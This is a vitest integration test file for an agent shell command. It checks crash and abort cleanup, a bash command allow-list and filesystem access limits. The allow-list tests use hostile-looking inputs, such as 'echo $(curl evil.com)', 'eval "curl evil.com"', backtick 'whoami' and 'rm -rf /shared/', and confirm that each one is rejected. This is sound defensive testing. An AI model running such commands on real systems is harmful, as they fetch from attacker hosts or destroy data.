/**
 * Error-and-abort hardening tests for the `agent` supplemental shell command.
 *
 * These integration tests exercise the full stack end-to-end
 * (command → hook → bridge → ScoopContext → cleanup) with a real
 * `VirtualFS` (via `fake-indexeddb/auto`) and a real `Orchestrator`,
 * mocking only the LLM/provider layer via the bridge's `createContext`
 * seam. For the allow-list and RestrictedFS scenarios the mock context
 * internally constructs the REAL bash tool wrapped with the REAL
 * `wrapBashToolWithAllowlist` so that the agent-loop-visible behavior
 * is exercised authentically.
 *
 * Scenarios covered (map to the mission's validation contract):
 *   (1) VAL-CROSS-006 — Agent-loop crash mid-stream:
 *       mock LLM throws mid-stream → stderr contains the error, exit 1,
 *       stdout empty, scratch folder deleted, scoop unregistered.
 *   (2) VAL-CROSS-007 / VAL-CLEAN-003 — Parent abort mid-run:
 *       with the mock hung inside `ctx.prompt()`, an external signal
 *       (simulating Ctrl+C / parent process teardown) causes `prompt()`
 *       to reject → spawn resolves (no hang), scratch folder deleted,
 *       scoop unregistered.
 *   (3) VAL-CROSS-008 / VAL-ALLOW-* — Allow-list bypass rejections:
 *       with a restricted allow-list, bypass attempts ($(), backticks,
 *       eval) are rejected inside the wrapped bash tool as tool-result
 *       errors (the tool returns isError, never throws). The scoop
 *       continues, runs an allowed command, and emits a final
 *       `send_message` that reaches stdout. Cleanup runs.
 *   (4) VAL-CROSS-009 — Allow-list pipeline/conjunction atomicity:
 *       a pipeline+conjunction with ALL heads allowed succeeds; flipping
 *       ONE segment to a disallowed head rejects the WHOLE line (no
 *       partial file effects observed). Cleanup runs.
 *   (5) VAL-CROSS-010 / VAL-FS-* — RestrictedFS ACL from bash end-to-end:
 *       a scoop spawned with a cwd writes successfully to its cwd,
 *       `/scoops/<uid>/`, and `/shared/`; writes to `/workspace/` or
 *       paths outside the ACL are blocked; EACCES does NOT terminate
 *       the agent loop — the scoop continues and emits a final
 *       `send_message`. Cleanup runs.
 *
 * Each scenario asserts two cleanup invariants on every path (success,
 * error, abort, rejected bash): the scratch folder no longer exists AND
 * the orchestrator's scoop registry no longer contains the bridge scoop.
 */

import 'fake-indexeddb/auto';
import type { IFileSystem } from 'just-bash';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { AgentTool, AgentToolResult } from '@mariozechner/pi-agent-core';

import {
  publishAgentBridge,
  AGENT_BRIDGE_GLOBAL_KEY,
  type AgentBridge,
  type AgentBridgeContext,
  type AgentBridgeContextArgs,
} from '../../src/scoops/agent-bridge.js';
import { Orchestrator } from '../../src/scoops/orchestrator.js';
import { type VirtualFS } from '../../src/fs/virtual-fs.js';
import type { RestrictedFS } from '../../src/fs/restricted-fs.js';
import { createAgentCommand } from '../../src/shell/supplemental-commands/agent-command.js';
import { WasmShell } from '../../src/shell/index.js';
import { createBashTool } from '../../src/tools/bash-tool.js';
import { wrapBashToolWithAllowlist } from '../../src/tools/bash-tool-allowlist.js';
import { adaptTool } from '../../src/core/tool-adapter.js';
import * as db from '../../src/scoops/db.js';

// ─── Fixtures ──────────────────────────────────────────────────────────

function stubWindowForOrchestrator(): void {
  vi.stubGlobal('window', {
    setInterval: globalThis.setInterval.bind(globalThis),
    clearInterval: globalThis.clearInterval.bind(globalThis),
  });
}

function makeOrchestrator(): Orchestrator {
  return new Orchestrator(
    {} as unknown as HTMLElement,
    {
      onResponse: () => {},
      onResponseDone: () => {},
      onSendMessage: () => {},
      onStatusChange: () => {},
      onError: () => {},
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      getBrowserAPI: () => ({}) as any,
    },
    { name: 'sliccy', triggerPattern: /^@sliccy\b/i }
  );
}

function clearPublishedBridge(): void {
  delete (globalThis as Record<string, unknown>)[AGENT_BRIDGE_GLOBAL_KEY];
}

function getPublishedBridge(): AgentBridge | undefined {
  return (globalThis as Record<string, unknown>)[AGENT_BRIDGE_GLOBAL_KEY] as
    | AgentBridge
    | undefined;
}

/** Shell `ctx` shape matching the `defineCommand` callback contract. */
function createMockShellCtx(vfs: VirtualFS, cwd = '/home') {
  const fs: Partial<IFileSystem> = {
    resolvePath: (base: string, path: string) => (path.startsWith('/') ? path : `${base}/${path}`),
    exists: (p: string) => vfs.exists(p),
    stat: async (p: string) => {
      const s = await vfs.stat(p);
      return {
        isFile: s.type === 'file',
        isDirectory: s.type === 'directory',
        isSymbolicLink: false,
        mode: 0o755,
        size: s.size,
        mtime: new Date(s.mtime),
      };
    },
  };
  return {
    fs: fs as IFileSystem,
    cwd,
    env: new Map<string, string>(),
    stdin: '',
  };
}

/**
 * List every directory entry under `/scoops` that begins with `agent-`.
 * Used to assert cleanup removed the spawned scoop's scratch folder and
 * left no orphan siblings.
 */
async function listAgentScratchFolders(vfs: VirtualFS): Promise<string[]> {
  try {
    const entries = await vfs.readDir('/scoops');
    return entries
      .filter((e) => e.type === 'directory' && e.name.startsWith('agent-'))
      .map((e) => e.name)
      .sort();
  } catch {
    return [];
  }
}

/** Extract text from an AgentToolResult for assertion purposes. */
function resultText(result: AgentToolResult<unknown>): string {
  return (result.content ?? [])
    .filter((c): c is { type: 'text'; text: string } => c.type === 'text')
    .map((c) => c.text)
    .join('');
}

function isErrorResult(result: AgentToolResult<unknown>): boolean {
  return Boolean((result.details as { isError?: boolean } | undefined)?.isError);
}

// ─── Test suite ────────────────────────────────────────────────────────

describe('agent error/abort hardening (integration)', () => {
  let vfs: VirtualFS;
  let orch: Orchestrator;

  beforeEach(async () => {
    stubWindowForOrchestrator();
    await db.initDB();
    clearPublishedBridge();
    orch = makeOrchestrator();
    await orch.init();
    const sharedFs = orch.getSharedFS();
    if (!sharedFs) throw new Error('orchestrator.getSharedFS() null after init');
    vfs = sharedFs;
    for (const dir of [
      '/home',
      '/home/wiki',
      '/home/other',
      '/workspace',
      '/workspace/existing',
      '/shared',
      '/tmp',
    ]) {
      try {
        await vfs.mkdir(dir, { recursive: true });
      } catch {
        /* already-exists */
      }
    }
  });

  afterEach(async () => {
    await orch.shutdown().catch(() => {});
    clearPublishedBridge();
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  // ─────────────────────────────────────────────────────────────────────
  // (1) VAL-CROSS-006 — Agent-loop crash mid-stream
  // ─────────────────────────────────────────────────────────────────────

  describe('(1) agent-loop crash mid-stream (VAL-CROSS-006)', () => {
    it('mock LLM throws mid-stream → stderr gets error, exit 1, stdout empty; scratch + registry cleaned', async () => {
      const foldersBeforeSpawn = await listAgentScratchFolders(vfs);
      const scoopsBeforeSpawn = orch.getScoops().map((s) => s.jid);

      const captured: AgentBridgeContextArgs[] = [];
      publishAgentBridge(orch, vfs, orch.getSessionStore(), {
        createContext: (args) => {
          captured.push(args);
          return {
            async init() {
              /* no-op */
            },
            async prompt(_text: string) {
              // Simulate: pi-agent-core streaming begins, then the provider
              // pipeline throws mid-stream. This surfaces to the bridge as
              // a rejected `ctx.prompt()` promise, which the bridge MUST
              // catch and convert into `{ exitCode: 1, finalText }` while
              // still running the full cleanup path.
              throw new Error('LLM stream error: provider returned 429 Rate Limit');
            },
            dispose() {
              /* no-op */
            },
            getAgentMessages() {
              return [];
            },
          };
        },
        generateUid: () => 'crash1',
        resolveModel: (id) => id,
        getInheritedModelId: () => 'claude-opus-4-6',
      });

      const result = await createAgentCommand().execute(
        ['.', '*', 'please do a thing'],
        createMockShellCtx(vfs, '/home')
      );

      // Error surfaces cleanly: non-zero exit, empty stdout, message on stderr.
      expect(result.exitCode).toBe(1);
      expect(result.stdout).toBe('');
      expect(result.stderr).toContain('LLM stream error');
      expect(result.stderr).toContain('429 Rate Limit');
      // Single error line — no bare stack-trace leakage from the bridge.
      expect(result.stderr.split('\n').filter((l) => l.length > 0)).toHaveLength(1);

      // The bridge called createContext exactly once — the scoop was built
      // before the throw and cleanup ran on the rejection path.
      expect(captured).toHaveLength(1);
      expect(captured[0].scoop.folder).toBe('agent-crash1');

      // Cleanup invariants: scratch folder deleted, scoop unregistered.
      expect(await vfs.exists('/scoops/agent-crash1')).toBe(false);
      expect(await listAgentScratchFolders(vfs)).toEqual(foldersBeforeSpawn);
      expect(
        orch
          .getScoops()
          .map((s) => s.jid)
          .sort()
      ).toEqual(scoopsBeforeSpawn.sort());
      expect(orch.getScoop('agent_crash1')).toBeUndefined();
    });

    it('synchronous throw from ctx.prompt() also runs cleanup and returns exit 1', async () => {
      const foldersBeforeSpawn = await listAgentScratchFolders(vfs);

      publishAgentBridge(orch, vfs, orch.getSessionStore(), {
        createContext: () => ({
          async init() {
            /* no-op */
          },
          prompt() {
            // Synchronous throw — not a returned rejected promise. Must
            // still be caught by the bridge's try/catch + finally.
            throw new Error('synchronous agent-loop crash');
          },
          dispose() {
            /* no-op */
          },
          getAgentMessages() {
            return [];
          },
        }),
        generateUid: () => 'crashsync',
        resolveModel: (id) => id,
        getInheritedModelId: () => 'claude-opus-4-6',
      });

      const result = await createAgentCommand().execute(
        ['.', '*', 'boom'],
        createMockShellCtx(vfs, '/home')
      );

      expect(result.exitCode).toBe(1);
      expect(result.stdout).toBe('');
      expect(result.stderr).toContain('synchronous agent-loop crash');
      expect(await vfs.exists('/scoops/agent-crashsync')).toBe(false);
      expect(await listAgentScratchFolders(vfs)).toEqual(foldersBeforeSpawn);
      expect(orch.getScoop('agent_crashsync')).toBeUndefined();
    });
  });

  // ─────────────────────────────────────────────────────────────────────
  // (2) VAL-CROSS-007 / VAL-CLEAN-003 — Parent abort mid-run
  // ─────────────────────────────────────────────────────────────────────

  describe('(2) parent abort mid-run (VAL-CROSS-007 / VAL-CLEAN-003)', () => {
    it('abort while scoop awaits LLM → spawn resolves (no hang), scratch deleted, scoop unregistered', async () => {
      // The mock `ctx.prompt()` parks on this deferred. Triggering the
      // deferred's `reject` from OUTSIDE simulates a "parent abort" —
      // e.g., the LLM SDK raising an AbortError after the caller tore
      // down its AbortController, or a Ctrl+C propagating into the
      // agent loop. The bridge MUST catch the rejection, run cleanup,
      // and resolve `spawn()` — never hang.
      let rejectPromptExternally: ((err: Error) => void) | null = null;
      const promptBarrier = new Promise<void>((_, reject) => {
        rejectPromptExternally = (err) => reject(err);
      });

      let promptEntered = false;
      const captured: AgentBridgeContextArgs[] = [];

      publishAgentBridge(orch, vfs, orch.getSessionStore(), {
        createContext: (args) => {
          captured.push(args);
          return {
            async init() {
              /* no-op */
            },
            async prompt(_text: string) {
              promptEntered = true;
              // Hang until the external abort signal fires.
              await promptBarrier;
            },
            dispose() {
              /* no-op */
            },
            getAgentMessages() {
              return [];
            },
          };
        },
        generateUid: () => 'abortmid',
        resolveModel: (id) => id,
        getInheritedModelId: () => 'claude-opus-4-6',
      });

      // Kick off the spawn WITHOUT awaiting — the scoop is now "in flight".
      const spawnPromise = createAgentCommand().execute(
        ['.', '*', 'long-running task'],
        createMockShellCtx(vfs, '/home')
      );

      // Wait until prompt() has actually started — use a short polling
      // loop instead of a fixed sleep so the test does not rely on
      // wall-clock timing. Bound by 50 microtasks (ample for the bridge's
      // init() + mkdir() + prompt() dispatch to land).
      for (let i = 0; i < 50 && !promptEntered; i++) {
        await new Promise<void>((r) => setTimeout(r, 0));
      }
      expect(promptEntered).toBe(true);

      // Scratch folder exists mid-run.
      expect(await vfs.exists('/scoops/agent-abortmid')).toBe(true);
      // Scoop is visible in the orchestrator registry mid-run.
      expect(orch.getScoop('agent_abortmid')).toBeDefined();

      // Simulate the "parent abort": the LLM client rejects with an
      // AbortError because the caller tore down the controller.
      expect(rejectPromptExternally).not.toBeNull();
      rejectPromptExternally!(
        Object.assign(new Error('aborted: parent process teardown'), { name: 'AbortError' })
      );

      // spawn() MUST resolve — if this test hangs past the vitest default
      // timeout, the bridge has a missing abort handler / dangling await.
      const result = await spawnPromise;

      expect(result.exitCode).toBe(1);
      expect(result.stdout).toBe('');
      expect(result.stderr).toContain('aborted');

      // Cleanup invariants after the abort path.
      expect(await vfs.exists('/scoops/agent-abortmid')).toBe(false);
      expect(orch.getScoop('agent_abortmid')).toBeUndefined();
      expect(orch.getScoopTabState('agent_abortmid')).toBeUndefined();
      expect(captured).toHaveLength(1);
    });

    it('abort during init() (before prompt) still runs cleanup and unregisters the scoop', async () => {
      // Edge case: the abort fires while `ctx.init()` is still resolving.
      // The bridge should still clean up — `ctx` is non-null by the time
      // the finally block runs, and the registry entry was inserted
      // before `init()` was awaited.
      const captured: AgentBridgeContextArgs[] = [];
      publishAgentBridge(orch, vfs, orch.getSessionStore(), {
        createContext: (args) => {
          captured.push(args);
          return {
            async init() {
              // Throw during init — the bridge's try/catch should still
              // run the finally path.
              throw Object.assign(new Error('init aborted by parent'), { name: 'AbortError' });
            },
            async prompt() {
              /* unreached */
            },
            dispose() {
              /* no-op */
            },
            getAgentMessages() {
              return [];
            },
          };
        },
        generateUid: () => 'abortinit',
        resolveModel: (id) => id,
        getInheritedModelId: () => 'claude-opus-4-6',
      });

      const result = await createAgentCommand().execute(
        ['.', '*', 'p'],
        createMockShellCtx(vfs, '/home')
      );

      expect(result.exitCode).toBe(1);
      expect(result.stderr).toContain('init aborted by parent');
      expect(await vfs.exists('/scoops/agent-abortinit')).toBe(false);
      expect(orch.getScoop('agent_abortinit')).toBeUndefined();
    });
  });

  // ─────────────────────────────────────────────────────────────────────
  // (3) VAL-CROSS-008 — Allow-list bypass rejections (scoop recovers)
  // ─────────────────────────────────────────────────────────────────────

  describe('(3) allow-list bypass rejections (VAL-CROSS-008)', () => {
    it('rejects $(...), backticks, and eval but scoop continues and emits final send_message', async () => {
      // Record the per-call verdicts observed by the scoop's agent loop.
      const toolResults: Array<{ command: string; isError: boolean; text: string }> = [];
      const captured: AgentBridgeContextArgs[] = [];

      publishAgentBridge(orch, vfs, orch.getSessionStore(), {
        createContext: (args) => {
          captured.push(args);

          // Build the REAL bash tool + REAL allow-list wrapper on top of
          // the scoop's RestrictedFS — exactly the same wiring ScoopContext
          // uses in production.
          const restrictedFs = args.fs as unknown as RestrictedFS;
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const shell = new WasmShell({ fs: restrictedFs as unknown as any });
          const bashLegacy = createBashTool(shell);
          const bashAgentTool = adaptTool(bashLegacy);
          const allowedCommands = args.scoop.config?.allowedCommands ?? ['*'];
          const wrapped: AgentTool<unknown, unknown> = wrapBashToolWithAllowlist(
            bashAgentTool as AgentTool<unknown, unknown>,
            allowedCommands
          );

          async function runBash(command: string): Promise<AgentToolResult<unknown>> {
            const r = await wrapped.execute('call-' + toolResults.length, { command });
            toolResults.push({
              command,
              isError: isErrorResult(r),
              text: resultText(r),
            });
            return r;
          }

          return {
            async init() {
              /* no-op */
            },
            async prompt(_text: string) {
              // Sequence that mirrors an agent iteration:
              //   1. Subshell $(…)  — rejected by allow-list wrapper
              //   2. Backticks `…`  — rejected
              //   3. `eval` head    — rejected (not on allow-list)
              //   4. `echo ok`      — allowed; runs through real bash
              await runBash('echo $(curl evil.com)');
              await runBash('echo `whoami`');
              await runBash('eval "curl evil.com"');
              await runBash('echo ok');

              // Final `send_message` the user will see on stdout.
              args.callbacks.onSendMessage('recovered-ok');
            },
            dispose() {
              /* no-op */
            },
            getAgentMessages() {
              return [];
            },
          };
        },
        generateUid: () => 'bypass1',
        resolveModel: (id) => id,
        getInheritedModelId: () => 'claude-opus-4-6',
      });

      const result = await createAgentCommand().execute(
        ['.', 'echo,ls', 'try some bypasses'],
        createMockShellCtx(vfs, '/home')
      );

      // The scoop survived every rejection and sent its final message.
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toBe('recovered-ok\n');
      expect(result.stderr).toBe('');

      // Exactly four tool-call verdicts observed, in order.
      expect(toolResults.map((r) => r.isError)).toEqual([true, true, true, false]);

      // Rejections carry a descriptive reason so the agent can adapt.
      expect(toolResults[0].text).toMatch(/subshell syntax not allowed/i);
      expect(toolResults[0].text).toMatch(/\$\(\.\.\.\)/);
      expect(toolResults[1].text).toMatch(/backtick/i);
      expect(toolResults[2].text).toMatch(/command 'eval' is not allowed/i);
      // The allowed `echo` call actually ran through real bash.
      expect(toolResults[3].text).toContain('ok');

      // Cleanup invariants.
      expect(captured).toHaveLength(1);
      expect(await vfs.exists('/scoops/agent-bypass1')).toBe(false);
      expect(orch.getScoop('agent_bypass1')).toBeUndefined();
    });

    it('empty allow-list rejects every bash call but scoop still emits a final message', async () => {
      // Guards VAL-CMD-019 + VAL-CLEAN-011 end-to-end: with allow-list ''
      // (empty), the wrapper rejects every invocation while the scoop
      // continues and the bridge cleans up.
      const toolResults: Array<{ isError: boolean; text: string }> = [];

      publishAgentBridge(orch, vfs, orch.getSessionStore(), {
        createContext: (args) => {
          const restrictedFs = args.fs as unknown as RestrictedFS;
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const shell = new WasmShell({ fs: restrictedFs as unknown as any });
          const wrapped = wrapBashToolWithAllowlist(
            adaptTool(createBashTool(shell)) as AgentTool<unknown, unknown>,
            args.scoop.config?.allowedCommands ?? []
          );
          return {
            async init() {
              /* no-op */
            },
            async prompt() {
              const r = await wrapped.execute('c1', { command: 'echo anything' });
              toolResults.push({ isError: isErrorResult(r), text: resultText(r) });
              args.callbacks.onSendMessage('empty-allowlist-survived');
            },
            dispose() {
              /* no-op */
            },
            getAgentMessages() {
              return [];
            },
          };
        },
        generateUid: () => 'emptylist',
        resolveModel: (id) => id,
        getInheritedModelId: () => 'claude-opus-4-6',
      });

      const result = await createAgentCommand().execute(
        ['.', '', 'prompt'],
        createMockShellCtx(vfs, '/home')
      );

      expect(result.exitCode).toBe(0);
      expect(result.stdout).toBe('empty-allowlist-survived\n');
      expect(toolResults[0].isError).toBe(true);
      expect(toolResults[0].text).toMatch(/command 'echo' is not allowed/);
      expect(await vfs.exists('/scoops/agent-emptylist')).toBe(false);
      expect(orch.getScoop('agent_emptylist')).toBeUndefined();
    });
  });

  // ─────────────────────────────────────────────────────────────────────
  // (4) VAL-CROSS-009 — Allow-list pipeline/conjunction atomicity
  // ─────────────────────────────────────────────────────────────────────

  describe('(4) allow-list pipelines/conjunctions (VAL-CROSS-009)', () => {
    it('accepts full pipeline+conjunction with all heads allowed; rejects whole line on a single disallowed segment', async () => {
      // Seed a file in /shared/ so the test can observe whether a
      // rejected line ever mutated the filesystem. The file MUST remain
      // byte-identical across both pipeline attempts.
      await vfs.writeFile('/shared/x', 'hi there\nhello world\nhi again\n');
      const preRejectionSha = await vfs.readTextFile('/shared/x');

      let acceptedIsError = false;
      let acceptedText = '';
      let rejectedIsError = false;
      let rejectedText = '';

      publishAgentBridge(orch, vfs, orch.getSessionStore(), {
        createContext: (args) => {
          const restrictedFs = args.fs as unknown as RestrictedFS;
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const shell = new WasmShell({ fs: restrictedFs as unknown as any });
          const wrapped = wrapBashToolWithAllowlist(
            adaptTool(createBashTool(shell)) as AgentTool<unknown, unknown>,
            args.scoop.config?.allowedCommands ?? []
          );
          return {
            async init() {
              /* no-op */
            },
            async prompt() {
              // Accepted line: every head is on the allow-list.
              const accepted = await wrapped.execute('c1', {
                command: 'cat /shared/x | wc -l && grep hi /shared/x',
              });
              acceptedIsError = isErrorResult(accepted);
              acceptedText = resultText(accepted);

              // Rejected line: swap a segment for a disallowed command.
              // The ENTIRE line must be rejected atomically — `cat` and
              // `wc` must not run, and `/shared/x` must remain untouched.
              const rejected = await wrapped.execute('c2', {
                command: 'cat /shared/x | wc -l && rm -rf /shared/',
              });
              rejectedIsError = isErrorResult(rejected);
              rejectedText = resultText(rejected);

              args.callbacks.onSendMessage('pipeline-ok');
            },
            dispose() {
              /* no-op */
            },
            getAgentMessages() {
              return [];
            },
          };
        },
        generateUid: () => 'pipeline',
        resolveModel: (id) => id,
        getInheritedModelId: () => 'claude-opus-4-6',
      });

      const result = await createAgentCommand().execute(
        // Allow-list with cat/wc/grep/echo — everything the accepted line needs.
        ['.', 'cat,wc,grep,echo', 'pipeline test'],
        createMockShellCtx(vfs, '/home')
      );

      expect(result.exitCode).toBe(0);
      expect(result.stdout).toBe('pipeline-ok\n');

      // First invocation succeeded; pipeline produced real shell output.
      expect(acceptedIsError).toBe(false);
      // `wc -l` counts 3 lines, and `grep hi` prints the two `hi` lines.
      expect(acceptedText).toMatch(/\b3\b/);
      expect(acceptedText).toContain('hi there');
      expect(acceptedText).toContain('hi again');

      // Second invocation was rejected atomically by the allow-list.
      expect(rejectedIsError).toBe(true);
      expect(rejectedText).toMatch(/command 'rm' is not allowed/);

      // VFS is byte-identical — the rejected line never executed any
      // segment, so `/shared/x` was never touched and `/shared/` was
      // never removed.
      expect(await vfs.exists('/shared/x')).toBe(true);
      expect(await vfs.readTextFile('/shared/x')).toBe(preRejectionSha);
      expect(await vfs.exists('/shared')).toBe(true);

      // Cleanup invariants.
      expect(await vfs.exists('/scoops/agent-pipeline')).toBe(false);
      expect(orch.getScoop('agent_pipeline')).toBeUndefined();
    });

    it('subshell / backtick inside a pipeline argument rejects the whole line', async () => {
      // A pipeline where the HEAD of each segment is allow-listed but
      // one arg smuggles a `$(...)` that would execute during expansion
      // must still be rejected — atomically, before any segment runs.
      await vfs.writeFile('/shared/y', 'alpha\nbeta\n');
      const precontent = await vfs.readTextFile('/shared/y');

      let verdict: { isError: boolean; text: string } | null = null;

      publishAgentBridge(orch, vfs, orch.getSessionStore(), {
        createContext: (args) => {
          const restrictedFs = args.fs as unknown as RestrictedFS;
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const shell = new WasmShell({ fs: restrictedFs as unknown as any });
          const wrapped = wrapBashToolWithAllowlist(
            adaptTool(createBashTool(shell)) as AgentTool<unknown, unknown>,
            args.scoop.config?.allowedCommands ?? []
          );
          return {
            async init() {
              /* no-op */
            },
            async prompt() {
              const r = await wrapped.execute('c1', {
                // `echo` + `wc` both allow-listed, but the echoed value is
                // `$(curl evil.com)` — rejected by the substitution walker.
                command: 'echo "$(curl evil.com)" | wc -c',
              });
              verdict = { isError: isErrorResult(r), text: resultText(r) };
              args.callbacks.onSendMessage('inline-ok');
            },
            dispose() {
              /* no-op */
            },
            getAgentMessages() {
              return [];
            },
          };
        },
        generateUid: () => 'inlinecs',
        resolveModel: (id) => id,
        getInheritedModelId: () => 'claude-opus-4-6',
      });

      const result = await createAgentCommand().execute(
        ['.', 'echo,wc', 'subshell bypass'],
        createMockShellCtx(vfs, '/home')
      );

      expect(result.exitCode).toBe(0);
      expect(result.stdout).toBe('inline-ok\n');
      expect(verdict).not.toBeNull();
      expect(verdict!.isError).toBe(true);
      expect(verdict!.text).toMatch(/subshell syntax not allowed/i);

      // The shared file is still byte-identical.
      expect(await vfs.readTextFile('/shared/y')).toBe(precontent);
      expect(await vfs.exists('/scoops/agent-inlinecs')).toBe(false);
      expect(orch.getScoop('agent_inlinecs')).toBeUndefined();
    });
  });

  // ─────────────────────────────────────────────────────────────────────
  // (5) VAL-CROSS-010 — RestrictedFS ACL end-to-end from bash
  // ─────────────────────────────────────────────────────────────────────

  describe('(5) RestrictedFS ACL end-to-end from bash (VAL-CROSS-010)', () => {
    it('cwd/scoop/shared writes succeed; /workspace/ and outside-cwd paths EACCES; EACCES does not kill the loop', async () => {
      // Seed /workspace with a readable file so the R/O probe can pass.
      await vfs.writeFile('/workspace/existing/read-me.txt', 'workspace contents');
      // Seed /home/other with a file to confirm it stays untouched.
      await vfs.writeFile('/home/other/sentinel.txt', 'outside-cwd sentinel');
      const sentinelBefore = await vfs.readTextFile('/home/other/sentinel.txt');

      // Observed per-call verdicts from inside the scoop.
      const verdicts: Array<{ label: string; isError: boolean; text: string }> = [];

      publishAgentBridge(orch, vfs, orch.getSessionStore(), {
        createContext: (args) => {
          const restrictedFs = args.fs as unknown as RestrictedFS;
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          const shell = new WasmShell({ fs: restrictedFs as unknown as any });
          // Allow every command the probes need — we are testing FS ACL
          // enforcement, not the allow-list here.
          const wrapped = wrapBashToolWithAllowlist(
            adaptTool(createBashTool(shell)) as AgentTool<unknown, unknown>,
            ['*']
          );

          async function probe(label: string, command: string): Promise<void> {
            const r = await wrapped.execute(`c-${verdicts.length}`, { command });
            verdicts.push({ label, isError: isErrorResult(r), text: resultText(r) });
          }

          return {
            async init() {
              /* no-op */
            },
            async prompt() {
              const folder = args.scoop.folder;

              // (a) write to cwd — should succeed.
              await probe('cwd-write', 'echo cwd-ok > /home/wiki/out.txt');
              // (b) write to /scoops/<folder>/ — should succeed.
              await probe('scratch-write', `echo scratch-ok > /scoops/${folder}/tmp.txt`);
              // (c) write to /shared/ — should succeed.
              await probe('shared-write', 'echo shared-ok > /shared/note.md');
              // (d) read under /workspace/ — allowed.
              await probe('workspace-read', 'cat /workspace/existing/read-me.txt');
              // (e) write under /workspace/ — blocked (EACCES).
              //     EACCES MUST NOT kill the agent loop; further probes
              //     should still run after this one.
              await probe('workspace-write', 'echo denied > /workspace/existing/blocked.txt');
              // (f) write outside the cwd's subtree — also blocked.
              await probe('outside-cwd-write', 'echo escape > /home/other/escape.txt');
              // (g) write under the cwd again AFTER EACCES — should still work.
              await probe('cwd-write-again', 'echo still-alive > /home/wiki/alive.txt');

              args.callbacks.onSendMessage('acl-ok');
            },
            dispose() {
              /* no-op */
            },
            getAgentMessages() {
              return [];
            },
          };
        },
        generateUid: () => 'aclrun',
        resolveModel: (id) => id,
        getInheritedModelId: () => 'claude-opus-4-6',
      });

      const result = await createAgentCommand().execute(
        ['/home/wiki', '*', 'acl probe'],
        createMockShellCtx(vfs, '/home')
      );

      // Agent loop completed cleanly with final send_message.
      expect(result.exitCode).toBe(0);
      expect(result.stdout).toBe('acl-ok\n');
      expect(result.stderr).toBe('');

      // Per-probe verdicts — build a map so the assertions read clearly.
      const byLabel = new Map(verdicts.map((v) => [v.label, v]));

      // Allowed writes succeeded.
      expect(byLabel.get('cwd-write')?.isError).toBe(false);
      expect(byLabel.get('scratch-write')?.isError).toBe(false);
      expect(byLabel.get('shared-write')?.isError).toBe(false);
      // Workspace is readable.
      expect(byLabel.get('workspace-read')?.isError).toBe(false);
      expect(byLabel.get('workspace-read')?.text).toContain('workspace contents');
      // Workspace write + outside-cwd write are BLOCKED.
      expect(byLabel.get('workspace-write')?.isError).toBe(true);
      expect(byLabel.get('outside-cwd-write')?.isError).toBe(true);
      // And EACCES did NOT kill the loop — the final probe ran and succeeded.
      expect(byLabel.get('cwd-write-again')?.isError).toBe(false);
      // Every probe ran to completion.
      expect(verdicts.map((v) => v.label)).toEqual([
        'cwd-write',
        'scratch-write',
        'shared-write',
        'workspace-read',
        'workspace-write',
        'outside-cwd-write',
        'cwd-write-again',
      ]);

      // VFS state post-run: allowed writes are persisted; blocked writes
      // left no file behind; sentinel outside cwd is untouched.
      expect(await vfs.readTextFile('/home/wiki/out.txt')).toContain('cwd-ok');
      expect(await vfs.readTextFile('/shared/note.md')).toContain('shared-ok');
      expect(await vfs.readTextFile('/home/wiki/alive.txt')).toContain('still-alive');
      expect(await vfs.exists('/workspace/existing/blocked.txt')).toBe(false);
      expect(await vfs.exists('/home/other/escape.txt')).toBe(false);
      expect(await vfs.readTextFile('/home/other/sentinel.txt')).toBe(sentinelBefore);

      // Cleanup invariants: scratch folder deleted (the scratch write
      // file is removed with it), scoop unregistered.
      expect(await vfs.exists('/scoops/agent-aclrun')).toBe(false);
      expect(orch.getScoop('agent_aclrun')).toBeUndefined();
    });
  });
});
